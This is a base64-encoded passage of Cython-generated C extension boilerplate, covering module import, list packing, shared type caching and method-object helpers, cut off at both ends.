9fSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHsKICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7CiAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfSW1wb3J0KG5hbWUsIE5VTEwsIDApOwogICAgaWYgKCFwYXJ0c190dXBsZSB8fCB1bmxpa2VseSghbW9kdWxlKSkKICAgICAgICByZXR1cm4gbW9kdWxlOwogICAgaW1wb3J0ZWRfbW9kdWxlID0gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9Mb29rdXAobmFtZSk7CiAgICBpZiAobGlrZWx5KGltcG9ydGVkX21vZHVsZSkpIHsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICByZXR1cm4gaW1wb3J0ZWRfbW9kdWxlOwogICAgfQogICAgUHlFcnJfQ2xlYXIoKTsKICAgIHJldHVybiBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKG1vZHVsZSwgbmFtZSwgcGFydHNfdHVwbGUpOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpOwogICAgaWYgKGxpa2VseShtb2R1bGUpKSB7CiAgICAgICAgUHlPYmplY3QgKnNwZWMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtb2R1bGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGVjKTsKICAgICAgICBpZiAobGlrZWx5KHNwZWMpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICp1bnNhZmUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihzcGVjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdGlhbGl6aW5nKTsKICAgICAgICAgICAgaWYgKGxpa2VseSghdW5zYWZlIHx8ICFfX1B5eF9QeU9iamVjdF9Jc1RydWUodW5zYWZlKSkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihzcGVjKTsKICAgICAgICAgICAgICAgIHNwZWMgPSBOVUxMOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFB5X1hERUNSRUYodW5zYWZlKTsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseSghc3BlYykpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICAgICAgcmV0dXJuIG1vZHVsZTsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHNwZWMpOwogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgfSBlbHNlIGlmIChQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZShuYW1lLCBwYXJ0c190dXBsZSk7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKSB7CiAgICB2YV9saXN0IHZhOwogICAgUHlPYmplY3QgKmwgPSBQeUxpc3RfTmV3KG4pOwogICAgdmFfc3RhcnQodmEsIG4pOwogICAgaWYgKHVubGlrZWx5KCFsKSkgZ290byBlbmQ7CiAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPG47ICsraSkgewogICAgICAgIFB5T2JqZWN0ICphcmcgPSB2YV9hcmcodmEsIFB5T2JqZWN0Kik7CiAgICAgICAgUHlfSU5DUkVGKGFyZyk7CiAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShsLCBpLCBhcmcpICE9ICgwKSkgewogICAgICAgICAgICBQeV9DTEVBUihsKTsKICAgICAgICAgICAgZ290byBlbmQ7CiAgICAgICAgfQogICAgfQogICAgZW5kOgogICAgdmFfZW5kKHZhKTsKICAgIHJldHVybiBsOwp9CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKSB7CiAgICBQeU9iamVjdCogdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSAmJiBQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkgewogICAgICAgIGNvbnN0IGNoYXIqIG1vZHVsZV9uYW1lX3N0ciA9IDA7CiAgICAgICAgUHlPYmplY3QqIG1vZHVsZV9uYW1lID0gMDsKICAgICAgICBQeU9iamVjdCogbW9kdWxlX2RvdCA9IDA7CiAgICAgICAgUHlPYmplY3QqIGZ1bGxfbmFtZSA9IDA7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICBtb2R1bGVfbmFtZV9zdHIgPSBQeU1vZHVsZV9HZXROYW1lKG1vZHVsZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZV9zdHIpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgbW9kdWxlX25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhtb2R1bGVfbmFtZV9zdHIpOwogICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgbW9kdWxlX2RvdCA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIxKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZV9kb3QpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgZnVsbF9uYW1lID0gUHlVbmljb2RlX0NvbmNhdChtb2R1bGVfZG90LCBuYW1lKTsKICAgICAgICBpZiAodW5saWtlbHkoIWZ1bGxfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH0KICAgICAgICAjaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XAogICAgICAgICAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlcykpCiAgICAgICAgICAgICAgICBnb3RvIG1vZGJhZDsKICAgICAgICAgICAgdmFsdWUgPSBQeU9iamVjdF9HZXRJdGVtKG1vZHVsZXMsIGZ1bGxfbmFtZSk7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgdmFsdWUgPSBQeUltcG9ydF9HZXRNb2R1bGUoZnVsbF9uYW1lKTsKICAgICAgICAjZW5kaWYKICAgICAgbW9kYmFkOgogICAgICAgIFB5X1hERUNSRUYoZnVsbF9uYW1lKTsKICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9kb3QpOwogICAgICAgIFB5X1hERUNSRUYobW9kdWxlX25hbWUpOwogICAgfQogICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW1wb3J0RXJyb3IsICJjYW5ub3QgaW1wb3J0IG5hbWUgJVMiLCBuYW1lKTsKICAgIH0KICAgIHJldHVybiB2YWx1ZTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseV9HZW5lcmljKFB5T2JqZWN0ICpzZXEsIFB5X3NzaXplX3QgbXVsKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0LCAqcHltdWwgPSBQeUxvbmdfRnJvbVNzaXplX3QobXVsKTsKICAgIGlmICh1bmxpa2VseSghcHltdWwpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlOdW1iZXJfTXVsdGlwbHkoc2VxLCBweW11bCk7CiAgICBQeV9ERUNSRUYocHltdWwpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseShQeU9iamVjdCAqc2VxLCBQeV9zc2l6ZV90IG11bCkgewojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICBQeVR5cGVPYmplY3QgKnR5cGUgPSBQeV9UWVBFKHNlcSk7CiAgICBpZiAobGlrZWx5KHR5cGUtPnRwX2FzX3NlcXVlbmNlICYmIHR5cGUtPnRwX2FzX3NlcXVlbmNlLT5zcV9yZXBlYXQpKSB7CiAgICAgICAgcmV0dXJuIHR5cGUtPnRwX2FzX3NlcXVlbmNlLT5zcV9yZXBlYXQoc2VxLCBtdWwpOwogICAgfSBlbHNlCiNlbmRpZgogICAgewogICAgICAgIHJldHVybiBfX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5X0dlbmVyaWMoc2VxLCBtdWwpOwogICAgfQp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKSB7CiAgICByZXR1cm4gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUFlYX0FCSV9NT0RVTEVfTkFNRSk7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlEaWN0X1NldERlZmF1bHQoUHlPYmplY3QgKmQsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICpkZWZhdWx0X3ZhbHVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX3NhZmVfdHlwZSkgewogICAgUHlPYmplY3QqIHZhbHVlOwogICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaXNfc2FmZV90eXBlKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHZhbHVlID0gUHlPYmplY3RfQ2FsbE1ldGhvZChkLCAic2V0ZGVmYXVsdCIsICJPTyIsIGtleSwgZGVmYXVsdF92YWx1ZSk7CiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgIFB5RGljdF9TZXREZWZhdWx0UmVmKGQsIGtleSwgZGVmYXVsdF92YWx1ZSwgJnZhbHVlKTsKI2Vsc2UKICAgIHZhbHVlID0gUHlEaWN0X1NldERlZmF1bHQoZCwga2V5LCBkZWZhdWx0X3ZhbHVlKTsKICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSByZXR1cm4gTlVMTDsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbmRpZgogICAgcmV0dXJuIHZhbHVlOwp9CgoKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobW9kdWxlLCBzcGVjLCBiYXNlcyk7CiAgICBpZiAocmVzdWx0ICYmIG1ldGFjbGFzcykgewogICAgICAgIFB5T2JqZWN0ICpvbGRfdHAgPSAoUHlPYmplY3QqKVB5X1RZUEUocmVzdWx0KTsKICAgIFB5X0lOQ1JFRigoUHlPYmplY3QqKW1ldGFjbGFzcyk7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKICAgICAgICBQeV9TRVRfVFlQRShyZXN1bHQsIG1ldGFjbGFzcyk7CiNlbHNlCiAgICAgICAgcmVzdWx0LT5vYl90eXBlID0gbWV0YWNsYXNzOwojZW5kaWYKICAgICAgICBQeV9ERUNSRUYob2xkX3RwKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhtZSwgbW8sIHMsIGIpIFB5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZShQeU9iamVjdCAqY2FjaGVkX3R5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjaGFyICpuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBleHBlY3RlZF9iYXNpY3NpemUpIHsKICAgIFB5X3NzaXplX3QgYmFzaWNzaXplOwogICAgaWYgKCFQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaXMgbm90IGEgdHlwZSBvYmplY3QiLCBuYW1lKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAoZXhwZWN0ZWRfYmFzaWNzaXplID09IDApIHsKICAgICAgICByZXR1cm4gMDsgLy8gc2l6ZSBpcyBpbmhlcml0ZWQsIG5vdGhpbmcgdXNlZnVsIHRvIGNoZWNrCiAgICB9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfYmFzaWNzaXplOwogICAgcHlfYmFzaWNzaXplID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhjYWNoZWRfdHlwZSwgIl9fYmFzaWNzaXplX18iKTsKICAgIGlmICh1bmxpa2VseSghcHlfYmFzaWNzaXplKSkgcmV0dXJuIC0xOwogICAgYmFzaWNzaXplID0gUHlMb25nX0FzU3NpemVfdChweV9iYXNpY3NpemUpOwogICAgUHlfREVDUkVGKHB5X2Jhc2ljc2l6ZSk7CiAgICBweV9iYXNpY3NpemUgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KGJhc2ljc2l6ZSA9PSAoUHlfc3NpemVfdCktMSkgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIC0xOwojZWxzZQogICAgYmFzaWNzaXplID0gKChQeVR5cGVPYmplY3QqKSBjYWNoZWRfdHlwZSktPnRwX2Jhc2ljc2l6ZTsKI2VuZGlmCiAgICBpZiAoYmFzaWNzaXplICE9IGV4cGVjdGVkX2Jhc2ljc2l6ZSkgewogICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICJTaGFyZWQgQ3l0aG9uIHR5cGUgJS4yMDBzIGhhcyB0aGUgd3Jvbmcgc2l6ZSwgdHJ5IHJlY29tcGlsaW5nIiwKICAgICAgICAgICAgbmFtZSk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5VHlwZU9iamVjdCAqX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5T2JqZWN0ICphYmlfbW9kdWxlID0gTlVMTCwgKmNhY2hlZF90eXBlID0gTlVMTCwgKmFiaV9tb2R1bGVfZGljdCwgKm5ld19jYWNoZWRfdHlwZSwgKnB5X29iamVjdF9uYW1lOwogICAgaW50IGdldF9pdGVtX3JlZl9yZXN1bHQ7CiAgICBjb25zdCBjaGFyKiBvYmplY3RfbmFtZSA9IHN0cnJjaHIoc3BlYy0+bmFtZSwgJy4nKTsKICAgIG9iamVjdF9uYW1lID0gb2JqZWN0X25hbWUgPyBvYmplY3RfbmFtZSsxIDogc3BlYy0+bmFtZTsKICAgIHB5X29iamVjdF9uYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcob2JqZWN0X25hbWUpOwogICAgaWYgKCFweV9vYmplY3RfbmFtZSkgcmV0dXJuIE5VTEw7CiAgICBhYmlfbW9kdWxlID0gX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUoKTsKICAgIGlmICghYWJpX21vZHVsZSkgZ290byBkb25lOwogICAgYWJpX21vZHVsZV9kaWN0ID0gUHlNb2R1bGVfR2V0RGljdChhYmlfbW9kdWxlKTsKICAgIGlmICghYWJpX21vZHVsZV9kaWN0KSBnb3RvIGRvbmU7CiAgICBnZXRfaXRlbV9yZWZfcmVzdWx0ID0gX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoYWJpX21vZHVsZV9kaWN0LCBweV9vYmplY3RfbmFtZSwgJmNhY2hlZF90eXBlKTsKICAgIGlmIChnZXRfaXRlbV9yZWZfcmVzdWx0ID09IDEpIHsKICAgICAgICBpZiAoX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZSgKICAgICAgICAgICAgICBjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICBvYmplY3RfbmFtZSwKICAgICAgICAgICAgICBzcGVjLT5iYXNpY3NpemUpIDwgMCkgewogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgZ290byBkb25lOwogICAgfSBlbHNlIGlmICh1bmxpa2VseShnZXRfaXRlbV9yZWZfcmVzdWx0ID09IC0xKSkgewogICAgICAgIGdvdG8gYmFkOwogICAgfQogICAgQ1lUSE9OX1VOVVNFRF9WQVIobW9kdWxlKTsKICAgIGNhY2hlZF90eXBlID0gX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MobWV0YWNsYXNzLCBhYmlfbW9kdWxlLCBzcGVjLCBiYXNlcyk7CiAgICBpZiAodW5saWtlbHkoIWNhY2hlZF90eXBlKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhzcGVjLCAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlKSA8IDApKSBnb3RvIGJhZDsKICAgIG5ld19jYWNoZWRfdHlwZSA9IF9fUHl4X1B5RGljdF9TZXREZWZhdWx0KGFiaV9tb2R1bGVfZGljdCwgcHlfb2JqZWN0X25hbWUsIGNhY2hlZF90eXBlLCAxKTsKICAgIGlmICh1bmxpa2VseShuZXdfY2FjaGVkX3R5cGUgIT0gY2FjaGVkX3R5cGUpKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdfY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDsKICAgICAgICBQeV9ERUNSRUYoY2FjaGVkX3R5cGUpOwogICAgICAgIGNhY2hlZF90eXBlID0gbmV3X2NhY2hlZF90eXBlOwogICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKAogICAgICAgICAgICAgICAgY2FjaGVkX3R5cGUsCiAgICAgICAgICAgICAgICBvYmplY3RfbmFtZSwKICAgICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9IGVsc2UgewogICAgICAgIFB5X0RFQ1JFRihuZXdfY2FjaGVkX3R5cGUpOwogICAgfQpkb25lOgogICAgUHlfWERFQ1JFRihhYmlfbW9kdWxlKTsKICAgIFB5X0RFQ1JFRihweV9vYmplY3RfbmFtZSk7CiAgICBhc3NlcnQoY2FjaGVkX3R5cGUgPT0gTlVMTCB8fCBQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKTsKICAgIHJldHVybiAoUHlUeXBlT2JqZWN0ICopIGNhY2hlZF90eXBlOwpiYWQ6CiAgICBQeV9YREVDUkVGKGNhY2hlZF90eXBlKTsKICAgIGNhY2hlZF90eXBlID0gTlVMTDsKICAgIGdvdG8gZG9uZTsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpzZWxmLCBDWVRIT05fVU5VU0VEIHZvaWQqIGNvbnRleHQpIHsKICAgIHJldHVybiBQeVVuaWNvZGVfRnJvbVN0cmluZyhfX1BZWF9BQklfTU9EVUxFX05BTUUpOwp9CnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXRbXSA9IHsKICAgIHsiX19tb2R1bGVfXyIsIF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2dldF9tb2R1bGUsIE5VTEwsIE5VTEwsIE5VTEx9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zbG90c1tdID0gewogICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXR9LAogICAgezAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjID0gewogICAgX19QWVhfVFlQRV9NT0RVTEVfUFJFRklYICJfY29tbW9uX3R5cGVzX21ldGF0eXBlIiwKICAgIDAsCiAgICAwLAojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwKICAgIFB5X1RQRkxBR1NfRElTQUxMT1dfSU5TVEFOVElBVElPTiB8CiNlbmRpZgogICAgUHlfVFBGTEFHU19ERUZBVUxULAogICAgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHMKfTsKc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KFB5T2JqZWN0ICptb2R1bGUpIHsKICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7CiAgICBQeU9iamVjdCAqYmFzZXMgPSBQeVR1cGxlX1BhY2soMSwgJlB5VHlwZV9UeXBlKTsKICAgIGlmICh1bmxpa2VseSghYmFzZXMpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhOVUxMLCBtb2R1bGUsICZfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjLCBiYXNlcyk7CiAgICBQeV9ERUNSRUYoYmFzZXMpOwogICAgaWYgKHVubGlrZWx5KG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlID09IE5VTEwpKSB7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbXSA9IHtmdW5jLCBzZWxmfTsKICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9WZWN0b3JjYWxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUsIGFyZ3MsIDIsIE5VTEwpOwogICAgfQogICAgI2Vsc2UKICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbk9iakFyZ3MoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgZnVuYywgc2VsZiwgTlVMTCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0KI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih0eXApOwogICAgaWYgKCFzZWxmKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoZnVuYyk7CiAgICByZXR1cm4gUHlNZXRob2RfTmV3KGZ1bmMsIHNlbGYpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiAoQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpCnsKICAgIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogICAgUHlPYmplY3QgKmt3bmFtZXM7CiAgICBQeU9iamVjdCAqKm5ld2FyZ3M7CiAgICBQeU9iamVjdCAqKmt3dmFsdWVzOwogICAgUHlfc3NpemVfdCBpLCBwb3M7CiAgICBzaXplX3QgajsKICAgIFB5T2JqZWN0ICprZXksICp2YWx1ZTsKICAgIHVuc2lnbmVkIGxvbmcga2V5c19hcmVfc3RyaW5nczsKICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X1NpemUoa3cpOwogICAgaWYgKHVubGlrZWx5KG5rdyA9PSAtMSkpIHJldHVybiBOVUxMOwogICAgI2Vsc2UKICAgIFB5X3NzaXplX3Qgbmt3ID0gUHlEaWN0X0dFVF9TSVpFKGt3KTsKICAgICNlbmRpZgogICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTsKICAgIGlmICh1bmxpa2VseShuZXdhcmdzID09IE5VTEwpKSB7CiAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZvciAoaiA9IDA7IGogPCBuYXJnczsgaisrKSBuZXdhcmdzW2pdID0gYXJnc1tqXTsKICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpOwogICAgaWYgKHVubGlrZWx5KGt3bmFtZXMgPT0gTlVMTCkpIHsKICAgICAgICBQeU1lbV9GcmVlKG5ld2FyZ3MpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAga3d2YWx1ZXMgPSBuZXdhcmdzICsgbmFyZ3M7CiAgICBwb3MgPSBpID0gMDsKICAgIGtleXNfYXJlX3N0cmluZ3MgPSBQeV9UUEZMQUdTX1VOSUNPREVfU1VCQ0xBU1M7CiAgICB3aGlsZSAoUHlEaWN0X05leHQoa3csICZwb3MsICZrZXksICZ2YWx1ZSkpIHsKICAgICAgICBrZXlzX2FyZV9zdHJpbmdzICY9CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICAgICAgUHlUeXBlX0dldEZsYWdzKFB5X1RZUEUoa2V5KSk7CiAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfVFlQRShrZXkpLT50cF9mbGFnczsKICAgICAgICAjZW5kaWYKICAgICAgICBQeV9JTkNSRUYoa2V5KTsKICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0oa3duYW1lcywgaSwga2V5KSA8IDApKSBnb3RvIGNsZWFudXA7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGt3bmFtZXMsIGksIGtleSk7CiAgICAgICAgI2VuZGlmCiAgICAgICAga3d2YWx1ZXNbaV0gPSB2YWx1ZTsKI